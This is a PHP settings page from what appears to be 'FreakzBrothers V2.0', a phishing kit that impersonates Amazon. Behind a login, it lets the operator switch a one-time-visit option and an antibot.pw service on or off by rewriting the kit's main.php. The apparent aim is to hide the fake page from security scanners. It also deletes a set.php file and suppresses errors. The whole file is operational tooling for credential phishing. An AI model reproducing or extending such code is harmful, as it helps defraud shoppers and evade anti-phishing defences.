<?php
/*
* #====================================================================================================================#
* ######################################################################################################################
* # ███████╗██████╗#███████╗#█████╗#██╗##██╗███████╗██████╗ ██████╗##██████╗#████████╗██╗##██╗███████╗██████╗#███████╗##
* # ██╔════╝██╔══██╗██╔════╝██╔══██╗██║ ██╔╝╚══███╔╝██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██║##██║██╔════╝██╔══██╗██╔════╝##
* # █████╗##██████╔╝█████╗##███████║█████╔╝###███╔╝#██████╔╝██████╔╝██║###██║###██║###███████║█████╗##██████╔╝███████╗##
* # ██╔══╝##██╔══██╗██╔══╝##██╔══██║██╔═██╗##███╔╝##██╔══██╗██╔══██╗██║###██║###██║###██╔══██║██╔══╝##██╔══██╗╚════██║##
* # ██║#####██║##██║███████╗██║##██║██║##██╗███████╗██████╔╝██║##██║╚██████╔╝###██║###██║##██║███████╗██║##██║███████║##
* # ╚═╝#####╚═╝##╚═╝╚══════╝╚═╝##╚═╝╚═╝##╚═╝╚══════╝╚═════╝#╚═╝##╚═╝#╚═════╝####╚═╝###╚═╝##╚═╝╚══════╝╚═╝##╚═╝╚══════╝##
* ######################################################################################################################
* ####################################### Copyright © FREAKZBROTHERS X AMAZON 2019 #####################################
* #====================================================================================================================#
*/

@require_once "../main.php";
// include '../blocker2.php';
error_reporting(0);
include '../config/config.php';
 
session_start();
if($_SESSION['user'] == ""){
header('location: ../login.php');
}
 
$off = $_GET['account'];
if(isset($off)){
  if($off == 'off'){
    session_destroy();
    unset($_SESSION['user']);
    session_unset();
    header('location: ../login.php');
  }
  else{
    echo '';
  }
}
?>
<!DOCTYPE html>
<html>

<head>
  <title>FreakzBrothers: Amazon</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  <script src="https://kit.fontawesome.com/a2ddabd525.js" crossorigin="anonymous"></script>
  <link rel="shortcut icon" href="amazon/Assets/img/favicon.ico" />
</head>
<body>
  <style type="text/css">
    .angka {
      font-weight: bold;
      font-size: 30px;
      float: right;
      margin-right: 10%
    }

    .text-warning {
      color: #FFC107
    }

    footer {
      font-size: 10px;
      font-weight: bold;
      font-family: arial;
      position: fixed;
      bottom: 0;
      right: 0;
      background: black;
      color: white;
      padding: 2px
    }

    .text-warning {
      color: #FFC107
    }
  </style>
  <div class="container">
    <nav class="navbar navbar-expand-sm bg-primary">
    <ul class="navbar-nav">
      <h1 style="display: inline-block; color: white; font-size: 40px;">&nbsp;&nbsp;&nbsp;<i class="fab fa-amazon"></i>
        <but>
          <font style="color:red;font-size:30px;"><b>FREAKZ</b></font><font style="color:white;font-size:30px;">BROTHERS</font>&nbsp;<font style="color:lime;font-size:30px;">V2.0</font>
            </b>
      </h1>
      </div>
  </nav><br>
<center><legend><font style="font-size:30px;display:inline-block;font-family:consolas;color:black;"><i class="fas fa-robot"></i>&nbsp;<strong>BLOCKER SETTING</strong></font></legend></center>
<nav class="navbar navbar-expand-lg">
  <div class="container">
    <table class="table">
      <thead class="thead-dark">
        <tr>
          <th>
            <center><h4><i class="fa fa-cog fa-1x"></i>&nbsp;SETTINGS</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-caret-right fa-1x"></i>&nbsp;NEW</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-code fa-1x"></i>&nbsp;OLD</h4></center>
          </th>
          <th>
            <center><h4><i class="fa fa-check fa-1x"></i>&nbsp;ACTION</h4></center>
          </th>
        </tr>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>ONETIME</b></font>
            </td>
            <td><select name="onetimeb" class="form-control" />
              <option disabled selected>SELECT</option>
              <option>YES</option>
              <option>NO</option></td>
            <td><input type="text" class="form-control" size="30" name="onetimel" value="<?php echo $onetime; ?>" required="required" readonly=""></td>
            <td><input name="onetime" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
        <form method="POST">
          <tr>
            <td>
              <font color="black"><b>ANTIBOT.PW</b></font>
            </td>
            <td><select name="antibotb" class="form-control" />
              <option disabled selected>SELECT</option>
              <option>Yoi</option>
              <option>Noi</option></td>
              <td><input type="text" class="form-control" size="30" name="antibotl" value="<?php echo $config['antibot.pw']; ?>" required="required" readonly=""></td>
            <td><input name="antibot" class="btn btn-dark btn-block" type="submit" Value="Save" /></td>
          </tr>
        </form>
      </thead>
    </table>
  </div>
</nav><br>
  <form method="POST">
    <center>
         || <a href="index.php?account=on" class="btn btn-link">
          <font color="purple"><b><i class="fa fa-home"></i>&nbsp;&nbsp;&nbsp;HOME</b></font>
        </a> || <a href="setting.php?account=on" class="btn btn-link"><font color="red"><b><i class="fa fa-cogs"></i>&nbsp;&nbsp;&nbsp;SETTING</b></font></a> || 
    </center>
  </form>
  <footer>
    <font color="green">Copyright</font> &copy; <font color="red">Freakz</font>
    <font color="white">Brothers</font> 2019.
  </footer>
</body>

</html>
<?php
   unlink("set.php");
 
    $antibotl     = trim($_POST['antibotl']);
    $antibotb     = trim($_POST['antibotb']);
    $onetimel        = trim($_POST['onetimel']);
    $onetimeb        = trim($_POST['onetimeb']);
    $file           = "../main.php";
    $isi            = file_get_contents($file);
 
if(isset($_POST['antibot'])) {
    if(preg_match("#\b$antibotkeyl\b#is", $isi)) {
        $isi = str_replace($antibotl,$antibotb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Please change your antibot key in blocker2.php')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#antibot.pw'/>";
          echo "<meta http-equiv='refresh' content='0; url=#antibot.pw'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
else if(isset($_POST['onetime'])) {
   if(preg_match("#\b$onetimel\b#is", $isi)) {
        $isi = str_replace($onetimel,$onetimeb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
 
        echo "<script>alert('Success')</script>";
        echo "<meta http-equiv='refresh' content='0; url=#onetime'/>";
          echo "<meta http-equiv='refresh' content='0; url=#onetime'/>";
    }
    else
         echo "<script>alert('Failed')</script>";
}
?>